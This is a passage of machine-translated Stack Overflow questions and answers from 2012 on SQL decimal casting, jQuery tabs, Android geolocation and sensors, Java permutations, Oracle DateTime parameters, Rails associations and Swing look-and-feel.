select cast(cast(82 - 56 as decimal) / 56 as decimal(9,2)) --.46 
```

所以我最终不得不同时转换一个操作数和整个表达式才能得到我想要的结果。有一个更好的方法吗？

请注意，我将等式放在顶部以表示我显然没有使用硬编码的数字（即建议我只是在数字后面加上“.0”将无济于事）。此外，我通常会将格式化方面留给报告软件，但它会不时复制到 Excel 电子表格中，我每次都必须手动格式化。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T20:14:35.637

当 a 除以`DECIMAL`an`INTEGER`时，`SQL Server`得到 a `DECIMAL`，精度定义为 p1 - s1 + s2 + max(6, s1 + p2 + 1)，其中`sn`和`pn`是第一个和第二个参数（除数和除数）的比例和精度.

最简单的方法是：

```
SELECT  CAST(1\. * (x - y) / y AS DECIMAL(9, 2)) 
```

`1.`是 a `DECIMAL(1, 0)`，乘以一个整数，得到 a `DECIMAL(n, 0)`。除以一个整数，它会产生一个`DECIMAL(n, 6)`（对于类似于您的示例中的数字顺序）。

然后需要将其转换`DECIMAL(9, 2)`为截断多余的数字。

# jquery - JQuery 选项卡 - 刷新时保持在同一选项卡上

> ID：10305136
> 
> 赞同：1
> 
> 时间：2012-04-24T19:58:31.823
> 
> 标签：jquery, tabs

我正在使用带有标签内容的 Jquery。无论我在哪个选项卡上，每当我刷新页面时，它总是返回到选项卡编号 1。如何让它留在我最初所在的选项卡上？

这是我的[测试站点](http://testsitefree.nfshost.com/)

谢谢你的帮助。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
    <script type="text/javascript" src="http://www.google.com/jsapi"></script>
    <title>test</title>
    <style type="text/css">
      #tabbed_box_1 {
        width: 855px;
      }
      .tabbed_area {
        background-color: #fff;
        padding: 0px;
      }
      ul.tabs {
        margin: 0px;
        padding: 0px;
      }
      ul.tabs li {
        display: inline;
        list-style: none;
      }
      ul.tabs li a {
        background-color: red;
        border: 1px solid #111;
        color: #fff;
        font-size: 20px;
        padding: 6px 16px;
      }
      ul.tabs li a:hover {
        border-color: #111;
        cursor: pointer;
      }
      ul.tabs li a.active {
        background-color: #fff;
        border: 1px solid #111;
        color: #666;
        cursor: pointer;
      }
      .tabrightcontent {
        background-color: #fff;
        border: 1px solid #111;
        height: 500px;
        padding: 20px;
      }
      #content_2,
      #content_3,
      #content_4,
      #content_5 {
        display: none;
      }
      ul.tabs {
        margin: 0px;
        margin-bottom: 0px;
        margin-top: 0px;
        padding: 0px;
      }
    </style>
  </head>
  <body>
    <script>
      $(document).ready(function () {
        $(".tabs a").click(function () {
          $(this).addClass("active").parent().siblings().find("a.active").removeClass("active");

          var id = $(this).parent().parent().find("a").index(this);
          $(this).parent().parent().parent().find(".tabrightcontent").css({
            display: "none"
          }).eq(id).css({
            display: "block"
          });
        });
      });
    </script>
    <div id="tabbed_box_1" class="tabbed_box">
      <div class="tabbed_area">
        <ul class="tabs">
          <li><a class="tab active">Tab Number 1</a></li>
          <li><a class="tab">Tab Number 2</a></li>
          <li><a class="tab">Tab Number 3</a></li>
        </ul>
        <div id="content_1" class="tabrightcontent">
          Tab Number 1 Content
        </div>
        <div id="content_2" class="tabrightcontent">
          Tab Number 2 Content
        </div>
        <div id="content_3" class="tabrightcontent">
          Tab Number 3 Content
        </div>
      </div>
    </div>
  </body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:05:09.670

创建选项卡时使用该`cookie`选项。

有关详细信息，请参阅[jQuery UI](http://jqueryui.com/demos/tabs/)文档，但这里是一个示例：

```
// Initialize a tabs with the cookie option specified.
$( ".selector" ).tabs({ cookie: { expires: 30 } });
// Get or set the cookie option, after init.
//getter
var cookie = $( ".selector" ).tabs( "option", "cookie" );
//setter
$( ".selector" ).tabs( "option", "cookie", { expires: 30 } ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:00:51.537

使用 document.location.hash，您可以在不刷新的情况下更改地址栏，因此每次单击选项卡时，将 document.location.hash 更改为唯一的（例如选项卡 ID）。

然后在页面加载时，检查 document.location.hash，如果它是选项卡的 id，则切换到该选项卡。

# android - 如果位置被关闭，WebChromeClient.onGeolocationPermissionsShowPrompt() 永远不会被调用

> ID：10305145
> 
> 赞同：2
> 
> 时间：2012-04-24T19:59:34.380
> 
> 标签：android, geolocation, webchromeclient

我有一个 WebView，它加载一个具有基于位置的功能的页面和一个覆盖了 onGeolocationPermissionsShowPrompt() 的 WebChromeClient。启用位置服务时，为页面启用位置可以正常工作。

问题是，如果用户的位置被关闭，我想提示他们打开它，但如果它被关闭，我从不点击 onGeolocationPermissionsShowPrompt()。是否仅在位置可用时才调用此函数？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2020-08-21T08:19:46.727

一种解决方案是不保留权限（`false`用作 中的第三个参数`callback`）。这可能导致过多的权限请求，因此在本地存储结果可以解决：

```
class MyWebChromeClient : WebChromeClient() {

    private var givenPermissions: Set<String> = emptySet()

    override fun onGeolocationPermissionsShowPrompt(origin: String, callback: GeolocationPermissions.Callback) {
        val onResult = { allow: Boolean -> callback(origin, allow, false) }
        when {
            origin in givenPermissions -> checkSystemPermission { granted ->
                if (!granted) givenPermissions -= origin
                onResult(granted)
            }
            else -> askForPermission { allow ->
                when (allow) {
                    false -> onResult(false)
                    true -> checkSystemPermission { granted ->
                        if (granted) givenPermissions += origin
                        onResult(granted)
                    }
                }
            }
        }
    }

    private fun askForPermission(callback: (Boolean) -> Unit) {
        // ask for permission
    }

    private fun checkSystemPermission(callback: (Boolean) -> Unit) {
        // check/ask for system permission
    }

} 
```

如果系统权限被撤销，`WebChromeClient`应该自动重新创建。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:07:16.013

不确定这是否正是您要寻找的，但我只是调用了一个方法 CheckEnableGPS()

```
//Method for turning GPS on if it isn't
    private void CheckEnableGPS(){    
    String provider = Settings.Secure.getString(getContentResolver(),      
    Settings.Secure.LOCATION_PROVIDERS_ALLOWED);       
    if(!provider.equals(""))
    {           
      //GPS Enabled        
    Toast.makeText(ShowMapActivity.this, "GPS Enabled: " + provider,          Toast.LENGTH_LONG).show();       
    }
    else
    {        
    Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);           startActivity(intent);      
       }   
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-08-30T14:55:55.027

您需要第二个和第三个参数为假

```
callback.invoke(origin, false, false); 
```

# database - 数据库人口的软件工程最佳实践

> ID：10305152
> 
> 赞同：1
> 
> 时间：2012-04-24T20:00:10.903
> 
> 标签：database, reflection, polymorphism

对不起，非描述性的标题，但我真的想不出该放什么。

我正在考虑将数据库中的项目与代码中的功能链接在一起的最佳方法。

例如，假设我有网球、足球和篮球的游戏类型。这些将保存在 GameType 表中的数据库中。

现在，打印给定游戏分数的功能对于每种游戏类型都会有所不同。所以我现在拥有的是这样的类结构：

```
public abstract class GameType {
    String name;
    public abstract String getScore(Score s);
}

public class Tennis extends GameType {
    String name = "Tennis";
    public String getScore(Score s){
        // Do something here specifically for tennis
    }
}

public class Football extends GameType {
    String name = "Football";
    public String getScore(Score s){
        // Do something here specifically for football
    }
} 
```

所以我的问题是：

将数据库中的条目与正确的类链接的最佳实践或编程模式是什么？目前我正在使用反射来获取与数据库中的条目同名的类，但我不相信这是最好的选择

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:53:48.237

对于小型应用程序，您可以研究[DAO 模式](http://java.sun.com/blueprints/corej2eepatterns/Patterns/DataAccessObject.html)，它是数据库交互的标准模式。
对于更大的应用程序，您应该研究 ORM 模型，例如[Hibernate](http://en.wikipedia.org/wiki/Hibernate_%28Java%29)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:08:19.367

您可以使用对象关系映射器 (ORM)，例如[NHibernate](http://nhforge.org/Default.aspx)。这会将关系数据映射到您的类之一，以便您可以轻松地使用数据库中的属性填充对象

# java - 递归生成列表的所有可能排列

> ID：10305153
> 
> 赞同：16
> 
> 时间：2012-04-24T20:00:11.400
> 
> 标签：java, algorithm, permutation

我正在尝试递归地生成列表中的所有项目。我已经看到了一些类似问题的解决方案，但我无法让我的代码正常工作。有人能指出我如何修复我的代码吗？

这对所有 S/O'ers 开放，而不仅仅是 Java 人员。

（另外我应该注意它会因 SO 异常而崩溃）。

样本输入：

```
[1, 2, 3] 
```

输出：

```
[1, 2, 3]
[1, 3, 2]
[2, 1, 3]
[2, 3, 1]
[3, 1, 2]
[3, 2, 1] 
```

```
//allPossibleItems is an AL of all items 

//this is called with generatePerm(null, new ArrayList<Item>);

private void generatePerm(Item i, ArrayList<Item> a) {
    if (i != null) { a.add(i); }
    if (a.size() == DESIRED_SIZE) {
        permutations.add(a);
        return;
    }
    for (int j = 0; j < allPossibleItems.size(); j++) {
        if (allPossibleItems.get(j) != i)
            generatePerm(allPossibleItems.get(j), a);
    }
} 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-04-24T20:19:42.467

如果`allPossibleItems`包含两个不同的元素 x 和 y，那么您连续将 x 和 y 写入列表，直到到达`DESIRED_SIZE`. 那是你真正想要的吗？如果你选择`DESIRED_SIZE`的足够大，堆栈上的递归调用就会太多，因此会出现 SO 异常。

我会做的是（如果原件没有连拍/重复）是：

```
public <E> List<List<E>> generatePerm(List<E> original) {
  if (original.isEmpty()) {
    List<List<E>> result = new ArrayList<>();
    result.add(new ArrayList<>());
    return result;
  }
  E firstElement = original.remove(0);
  List<List<E>> returnValue = new ArrayList<>();
  List<List<E>> permutations = generatePerm(original);
  for (List<E> smallerPermutated : permutations) {
    for (int index = 0; index <= smallerPermutated.size(); index++) {
      List<E> temp = new ArrayList<>(smallerPermutated);
      temp.add(index, firstElement);
      returnValue.add(temp);
    }
  }
  return returnValue;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-24T20:11:08.807

问题是您必须在进行递归调用之前[克隆ArrayList。](https://stackoverflow.com/questions/715650/how-to-clone-arraylist-and-also-clone-its-contents)否则，您将始终添加到同一个 ArrayList。

```
//allPossibleItems is an AL of all items

//this is called with generatePerm(null, new ArrayList<Item>);

private void generatePerm(Item i, ArrayList<Item> a) {
    if (i != null) { a.add(i); }
    if (a.size() == DESIRED_SIZE) {
        permutations.add(a);
        return;
    }
    for (int j = 0; j < allPossibleItems.size(); j++) {
        if (!a.contains(allPossibleItems.get(j))) {
            ArrayList<Item> b = clone(a);
            generatePerm(allPossibleItems.get(j), b);
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-04-03T20:54:54.570

谷歌搜索导致我这个问题。我发现以下方法比其他方法更快。

基本上我使用 Set 递归地生成排列。为了说明，第一个位置可以保存所有可能的值，第二个位置可以保存除第一个值之外的所有可能值，依此类推。当我们到达最后一个位置时，只有一种可能性。

就递归函数的参数而言，(1) 我们将已经记录的内容作为 currentstring 传递下去。(2) 我们传递保存结果的 Arraylist - list_of_permutes (3) 我们传递从中选择当前数字的集合 - currentnums。在最后一级，我们有一个完整的排列，然后将其添加到 arraylist - list_of_permutes 并向上返回。

```
public static ArrayList recurse_nums(Set<Integer> currentnums,
                                     String currentstring,
                                     ArrayList list_of_permutes) {
    if (currentnums.size() == 1) {
        int elem = currentnums.iterator().next();
        list_of_permutes.add(currentstring + Integer.toString(elem));
        return list_of_permutes;
    }
    for (int a : currentnums) {
        String newstring = currentstring + a;
        Set<Integer> newnums = new HashSet<>();
        newnums.addAll(currentnums);
        newnums.remove(a);
        recurse_nums(newnums, newstring, list_of_permutes);
    }
    return list_of_permutes;
} 
```

这可以从以下内容中调用：

```
public static ArrayList permute_array(int[] arr) {
    Set<Integer> currentnums = new HashSet<>();
    for (int i = 0; i < arr.length; i++) {
        currentnums.add(arr[i]);
    }
    ArrayList permutations = new ArrayList();
    recurse_nums(currentnums, "", permutations);
    return permutations;
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-07-25T03:34:05.003

### *map 和*reduce方法

*   输入列表可能包含重复项。

    ```
    List<String> list = Arrays.asList("", "", ""); 
    ```

*   该`map`方法将列表的每个元素表示*为排列映射列表*。

    ```
    1: [{0=}, {1=}, {2=}]
    2: [{0=}, {1=}, {2=}]
    3: [{0=}, {1=}, {2=}] 
    ```

*   该方法将这些列表对顺序求和，并将映射对连接成一个*排列映射*`reduce`的单个列表。

     *```
    {0=, 1=, 2=}
    {0=, 2=, 1=}
    {1=, 0=, 2=}
    {1=, 2=, 0=}
    {2=, 0=, 1=}
    {2=, 1=, 0=} 
    ```* 

 *[在线尝试！](https://tio.run/##pVVRb9owEH7vrzj1KUEQWh4ZRasmpE1btUnsbdqDSQ4wOLZlO61Yy0@Z9gu2/bX9A3Z2QkihtEyLhEzOd@fvvjt/WbBb1lEa5SJbbjY818o4WJAxKRwXSevV2YHNOoMs91tnupgInkIqmLVww7iE@zOgp7Jbxxwtt4pnkNNuNHaGy9mXr8DMzMaVs3@6XeBSFw4Et662fqCXQRkzDDtwBdfGsJVNmPWb0fmf7z9@nrfBr7@q9fd5/KqZWCtr@UQgaDR54SEpaR@fccP04J10OEPThurAIWhN522jPzWCI4/l8SGqcAS/tmidTJUZsXQejVfWYZ6QQ7@vKbMTsgpdn4Wl22qVcS14rZlheVmqm2ODkzYRuIJUSedZzgpN/DKHdi9yMBpCiHQrjaCm4T8KzFG67euOYgoz6Aoja7v3eYavVveJ9vozD1kceQKf4i64jsp@7o1AOsd0CXwHE7gFqWRHFkIAk1l4wVy7VR1G3lE5GlcQ3B4eQmhi@TeMYm@@iKEq840SAtOAIwlpwhA1Oln5URXjcsoNkzOMLtrNnHHt3sBuUBu0nmakrpfot8QzC2xH744M6qm2B8kSsn5WHyeLiENn@M9YGpiWuIJOjYK6wf2pbbhlosDGDncWxfRoph2ghQfUJNHSTRHolKTeR4sK2QxdtIifh1aWNDiYGxqb4XEgaXl0VEFQxiZOlT081pWsSJHYL0XL8@8hWnDKGwP6x5pTn1WGRmG4LsvKerGvPxgqFYyOF5lMBXOeFmLvchvXezmugX7KhUPjtYVuhLLoG0rQ54xGylBVglJlK6gG78WMSZnPA@p5QH5NKOWY@hWfDqxOR5cRb5gjjfMl9vuVOtn3uIpPqo8CvIhJ@gEVYDjaIFJ3KtyMNiiTUf05cwTbvlxfXrIdipN4R6okl5i9ZXa@J02kC/f3JxVK@nstRCiwIROnRfROiFivn78nW9VIVT7hcu/b9f/3Q5HSmjtOo8UkBEWEtL7eh3eCPmnCYnRERuvP2nqz@Qs "Java (OpenJDK 8) – 在线试用")

```
public static void main(String[] args) {
    // input list
    List<String> list = Arrays.asList("", "", "");
    // possible permutations
    List<Map<Integer, String>> pp = possiblePermutations(list);
    // output
    pp.forEach(System.out::println);
} 
```

```
/**
 * @param list the input list, may contain duplicates
 * @param <E>  the type of the element of the list
 * @return the list of possible permutations
 */
public static <E> List<Map<Integer, E>> possiblePermutations(List<E> list) {
    // check if the list is non-null and non-empty
    if (list == null || list.size() == 0) return Collections.emptyList();
    return IntStream.range(0, list.size())
            // represent each list element as a list of permutation maps
            .mapToObj(i -> IntStream.range(0, list.size())
                    // key - element position, value - element itself
                    .mapToObj(j -> Collections.singletonMap(j, list.get(j)))
                    // Stream<List<Map<Integer,E>>>
                    .collect(Collectors.toList()))
            // reduce a stream of lists to a single list
            .reduce((list1, list2) -> list1.stream()
                    .flatMap(map1 -> list2.stream()
                            // filter out those keys that are already present
                            .filter(map2 -> map2.keySet().stream()
                                    .noneMatch(map1::containsKey))
                            // concatenate entries of two maps, order matters
                            .map(map2 -> new LinkedHashMap<Integer, E>() {{
                                putAll(map1);
                                putAll(map2);
                            }}))
                    // list of combinations
                    .collect(Collectors.toList()))
            // otherwise an empty collection
            .orElse(Collections.emptyList());
} 
```

* * *

^(另请参阅：[Java 中使用递归的字符串排列](https://stackoverflow.com/a/67114390/16497917))

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-05-29T05:44:03.647

您可以保持开始固定，然后继续交换。这是最容易理解的方法之一。

```
public class PermutationListRecursion {
    private Set<List<Integer>> permList = new HashSet<>();

    public static void main(String[] args) {
        PermutationListRecursion pt = new PermutationListRecursion();
        Integer[] nums = {1, 2, 3};
        pt.permute(nums);
        System.out.println(pt.permList);
    }

    public void permute(Integer[] nums) {
        permutation(0, nums.length - 1, nums);
    }

    public void permutation(int start, int end, Integer[] nums) {
        if (start == end) {
            permList.add(new ArrayList<Integer>(Arrays.asList(nums)));
        }
        for (int i = start; i <= end; i++) {
            permList.add(swap(nums, start, i));
            permutation(start + 1, end, nums);
            permList.add(swap(nums, start, i));
        }
    }

    private List<Integer> swap(Integer[] arr, int a, int b) {
        if (a == b) {
            return new ArrayList<>(Arrays.asList(arr));
        }
        Integer temp = arr[b];
        arr[b] = arr[a];
        arr[a] = temp;
        return new ArrayList<>(Arrays.asList(arr));
    }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-12-05T10:25:54.020

我查看了这个线程，并分析了正确的解决方案。不幸的是，我需要这个递归来处理大量输入，这将导致创建很多我不需要存储的对象，我想对每个排列应用一个方法并只保留那些满足我的算法的对象，所以我想出了这个解决方案。希望它会帮助别人。

```
public static <E> void iteratePermutations(List<E> original, Consumer<List<E>> consumer) {
    Objects.requireNonNull(original);
    consumer.accept(original);
    iteratePermutationsRecursively(original, 0, consumer);
}

public static <E> void iteratePermutationsRecursively(List<E> original, int start, Consumer<List<E>> consumer) {
    Objects.requireNonNull(original);
    for (int i = start; i < original.size() - 1; i++) {
        for (int j = i + 1; j < original.size(); j++) {
            List<E> temp = new ArrayList<>(original);
            E tempVal = temp.get(i);
            temp.set(i, temp.get(j));
            temp.set(j, tempVal);
            consumer.accept(temp);
            iteratePermutationsRecursively(temp, i + 1, consumer);
        }
    }
} 
```

我可以被称为：

```
List<Integer> list = Arrays.asList(1, 2, 3, 4, 5);
List<List<Integer>> result = new ArrayList<>();
iteratePermutations(list, result::add); 
```

或者：

```
List<Integer> list = Arrays.asList(1, 2, 3, 4, 5);
iteratePermutations(list, System.out::println); 
```*

# jquery - jquery attr 组合命令

> ID：10305155
> 
> 赞同：0
> 
> 时间：2012-04-24T20:00:17.140
> 
> 标签：jquery, attr

我没有运气获得正确的语法来组合这些 jquery 行。append 可以与 attr() 一起使用，还是只需要单独调用或在回调中调用？它也不必附加，它是唯一写入该元素的东西，我只是不知道任何其他获取文本的方式。

```
$('#People').append(array.names[9]);
$('#People').attr({
    class: 'blueDescriptorBig'
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T20:03:35.750

我不确定我是否理解正确，但请参见下文

```
$('#People')
  .append(array.names[9])
  .addClass('blueDescriptorBig'); //Should use addClass instead of .attr for class 
```

# objective-c - 核心动画：光栅没有动画

> ID：10305158
> 
> 赞同：0
> 
> 时间：2012-04-24T20:00:31.310
> 
> 标签：objective-c, ios, xcode, core-animation

我试图通过将光栅应用于 CALayer 来执行快速而肮脏的“模糊”。CA 文档说 shouldRasterize 是可动画的，但是我没有得到任何动画。下面的代码：

```
 CABasicAnimation* blurAnimation;
 blurAnimation = [CABasicAnimation animationWithKeyPath:@"rasterize"];
 blurAnimation.removedOnCompletion = NO;
 blurAnimation.autoreverses = YES;
 blurAnimation.duration = 3.0f;
 blurAnimation.timingFunction = [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseInEaseOut];    
 blurAnimation.repeatCount = 20; // HUGE_VALF;
blurAnimation.fromValue = [NSNumber numberWithFloat:0.3f];
blurAnimation.toValue = [NSNumber numberWithFloat:1.0f];
[theCheck setShouldRasterize:YES];

 // Add animation to the layer and make it so
 [theCheck addAnimation:blurAnimation forKey:nil]; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:35:13.283

您是否尝试将“rasterize”更改为“rasterizationScale”？

# c# - 在参数化 SQL 字符串中使用 .Net DateTime 的正确方法

> ID：10305161
> 
> 赞同：6
> 
> 时间：2012-04-24T20:00:35.767
> 
> 标签：c#, .net, sql, oracle, datetime

关于在 Sql 语句中使用 .Net DateTime 有几个问题，但没有一个能解决我的问题。

我正在使用以下代码查询 Oracle 数据库：

```
private DataTable QueryByIdAndDate(string id, DateTime fdate, DateTime tdate) {
    string query = "SELECT * FROM table WHERE ID = :id AND DATE_TIME BETWEEN :from AND :to"
    DbCommand cmd = db.CreateCommand();
    cmd.CommandType = CommandType.Text;
    cmd.CommandText = query;

    DbParameter fromDate = CreateDateParameter(cmd, fdate);
    fromDate.ParameterName = "from";
    DbParameter toDate = CreateDateParameter(cmd, tdate);
    toDate.ParameterName = "to"; 
    DbParameter idParam = CreateStringParameter(cmd, id);
    idParam.ParameterName = "id";

    cmd.Parameters.AddRange(new DbParameter[] { fromDate, toDate, idParam });
    return db.ExecuteQuery(cmd);
}

private DbParameter CreateDateParameter(DbCommand cmd, DateTime date) {
    DbParameter param = cmd.CreateParameter();
    param.DbType = DbType.DateTime;
    param.Direction = ParameterDirection.Input;
    param.Value = date;
    return param;
} 
```

但它不能正常工作。像这样尝试代码时：

```
DataTable result = QueryByIdAndDate("12345", DateTime.Now, DateTime.Now.AddDays(1)); 
```

它给出了以下错误： ORA-01847: day of month must be between 1 and last day of month

我假设它与 DateTime 的格式化方式有关，但我不知道以可靠方式解决此问题的正确方法。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-24T20:18:18.427

（根据评论...）

看起来在这种情况下，参数的顺序很重要......尽管您已经给它们起了名字。我没想到会这样，这是驱动程序有些损坏的迹象，但是将您的代码更改为：

```
cmd.Parameters.AddRange(new DbParameter[] { idParam, fromDate, toDate }); 
```

应该修复它。（顺便说一下，这不一定是您构建参数的方式，但这在这里有些无关紧要。）

不要开始*将*日期/时间值指定为字符串。引入比您需要的更多的字符串转换是一个*非常糟糕的主意。*

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-24T20:11:18.883

将`DateTime`值转换为格式化的日期字符串：

```
private DbParameter CreateDateParameter(DbCommand cmd, DateTime date) 
{
     DbParameter param = cmd.CreateParameter();
     param.DbType = DbType.DateTime;
     param.Direction = ParameterDirection.Input;
     param.Value = date.ToString("yyyy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture);
     return param;
} 
```

即使您正在发送一个字符串值，`DbType`仍然设置为`DateTime`，因此该值应该被正确转换。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-24T20:15:02.810

Oracle 期望日期格式为“DD-Mon-YYYY”，因此您需要基本上以这种方式格式化您的日期值并将其分配给参数值。

编辑：我注意到最近版本的 ODP 似乎可以更好地处理日期时间参数。例如，当 WHERE 子句对日期/时间列有约束时，这很好用：

```
DateTime dt = new DateTime(2012, 5, 21);
cmd.Parameters.Add("some_date_param", dt); 
```

使用最新版本的 ODP 以这种方式运行查询可以正常工作。但是我有很多代码需要将日期/时间值作为格式化字符串传递，以便 Oracle 接受它们。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-11-22T14:58:19.423

对于那些可能会错过它的人，请参阅@kprobst在**@JonSkeet**[接受的答案](https://stackoverflow.com/a/10305391/98422)下的**评论**：

如果您尝试使用名称绑定而不`BindByName`在`Command`.

（整个 Oracle 提供程序 API 是一堆垃圾恕我直言）。

# android - Android 传感器旋转度数

> ID：10305162
> 
> 赞同：2
> 
> 时间：2012-04-24T20:00:39.007
> 
> 标签：android, math, sensors

我正在使用 TYPE_MAGNETIC_FIELD/TYPE_ACCELEROMETER 传感器来创建指南针。

我调用 getRotationMatrix 然后 remapCoordinateSystem （总是横向）交换轴然后 getOrientation 然后我取我当前需要的轴索引 0 然后我调用 toDegrees 然后我将它设为 0-360 范围

价值=（价值+ 360）% 360；

现在一切都很好，除了它波动有点大，所以我去搜索上帝（谷歌）并查找低通滤波器分配和大多数不工作那么好，但我发现一个几乎工作。

newval = oldVal + ALPHA * (newval-oldVal);

阿尔法约0.2-0.5

所以现在在 180（-180 旋转）它快速跳到 0，然后它转到 181（-179 旋转）但是如果我移除过滤器它不会这样做。

过滤器有什么问题或者我该如何解决这个问题。

Android 2.2 所以没有 TYPE_LINEAR_ACCELERATION 或 TYPE_ORIENTATION（已弃用）

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T19:30:30.713

您遇到的问题是方向角是周期性的。180 度旋转与 -180 度相同（如所指出的）也与 540 度相同等。因此，虽然低通滤波器的算法没有改变，但您需要的数字字段必须是周期性的才能给您好的答案。你得到一个代表你的方向的旋转矩阵，这些矩阵构成了一个非常好的数字系统。因此，如果您对旋转矩阵执行所有过滤算法，然后仅在最后一分钟转换为角度，您的过滤器将正常工作。

# java - containsKey 与网址不匹配

> ID：10305163
> 
> 赞同：1
> 
> 时间：2012-04-24T20:00:46.443
> 
> 标签：java, collections, map

我正在尝试将超链接存储为地图中的键，我正在使用多地图

```
 private Map<String, List<String>> record=new HashMap<String, List<String>>(); 
```

我正在使用以下方式检查地图中是否已经存在超链接

```
 record.containsKey(url) 
```

但是，即使 url 存在于 map 中，它也会为 map 中已经存在的相同 url 返回 false。那么我该如何解决这个问题

我存储的链接是

```
 http://101.13.20.343/test/wav/uploads/372.wav 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:05:27.777

这对我有用：

```
public static void main(String[] args) {
        Map<String, List<String>> record=new HashMap<String, List<String>>();
        record.put("http://101.13.20.343/test/wav/uploads/372.wav", new ArrayList<String>());
        System.out.println(record.containsKey("http://101.13.20.343/test/wav/uploads/372.wav"));
    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-24T20:06:38.680

您是否修剪了每一端的空格？在某些情况下，这可能是它？

# ruby-on-rails - Rails 多对多关系和嵌套形式：如果对象已经存在，则与对象关联

> ID：10305166
> 
> 赞同：0
> 
> 时间：2012-04-24T20:00:53.090
> 
> 标签：ruby-on-rails, ruby-on-rails-3, activerecord

我在我的 Rails 项目中遇到了几个多对多关系的问题。可以用一个例子来说明：

假设我有模型`Person`，并且`PhoneNumber`加入了`PersonPhoneNumber`。这种关系是多对多的，因为人们可以拥有多个电话号码，并且可以通过同一个电话号码联系到多个人（在帮助台等情况下）。

```
class Person < ActiveRecord::Base
  has_many :person_phone_numbers
  has_many :phone_numbers, :through => :person_phone_numbers
end

class PhoneNumber < ActiveRecord::Base
  has_many :person_phone_numbers
  has_many :people, :through => :person_phone_numbers
  validates :number, :uniqueness => true
end

class PersonPhoneNumber < ActiveRecord::Base
  belongs_to :person
  belongs_to :phone_number
end 
```

我有一个人员表单，可让我创建/更新人们的联系信息。我用它把号码分配`555-555-1212`给鲍勃。如果`PhoneNumber`不存在具有该编号的对象，我希望创建它（如标准`accepts_nested_attributes_for`行为）。但如果它确实存在，我只想创建一个`PersonPhoneNumber`对象来将 Bob 与它关联起来`PhoneNumber`。

我怎样才能最优雅地做到这一点？我尝试放入一个`before_validation`钩子`PersonPhoneNumber`来查找匹配`PhoneNumber`和设置`phone_number_id`，但这导致了非常奇怪的行为（包括使我的 Rails 服务器因消息而崩溃`Illegal instruction: 4`）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-25T06:55:48.497

你可以使用exists？首先检查是否存在的方法，如下所示：

```
@person.phone_numbers.build(number: "555-555-1212") unless @person.phone_numbers.exists(number: "555-555-1212") 
```

或者你可以这样做：

```
PhoneNumber.find_or_create(person_id: @person.id, number: "555-555-1212") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-13T22:31:11.087

Rachel the Rails documentation says this:

A has_and_belongs_to_many association creates a direct many-to-many connection with another model, with no intervening model.

What is the difference?

# java - 更改 Java 中的默认按钮以使它们看起来“更好”

> ID：10305170
> 
> 赞同：9
> 
> 时间：2012-04-24T20:01:07.140
> 
> 标签：java, swing, jbutton, calculator, look-and-feel

我本质上是在尝试模仿默认的 windows xp 简单计算器。当我在 Java 中更改按钮的背景颜色时，它使它们看起来非常扁平和“无聊”。我想让按钮看起来尽可能接近 Windows XP 计算器中的按钮。

这是一张将我的图片与 WinXp 的图片进行比较的图片： ![计算示例](../Images/b6fd746942ceba70225cfa70a85cde6f.png)

是否有某种方法可以用来更改按钮的样式，就像您可以在 Visual Basic 中所做的那样，使按钮几乎弹出更多或看起来像 Windows Xp 计算器一样具有 3D 效果。

Java中的默认按钮有点像我正在寻找的东西，除了渐变中没有白色而有更多的蓝色。

这是可能的，还是我被难看的按钮困住了？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-04-24T20:03:48.840

尝试在 main 方法的开头设置系统外观：

```
UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName()); 
```

这将加载所有具有原生外观的 Swing 小部件。

如果您对使用此命令实际执行的操作感兴趣，Oracle 有一个关于外观和感觉的不错的教程：http: [//docs.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html](http://docs.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html)

# sql - T-SQL 函数将时间舍入到最早小时的问题

> ID：10305172
> 
> 赞同：1
> 
> 时间：2012-04-24T20:01:17.280
> 
> 标签：sql, sql-server-2008, tsql, datetime

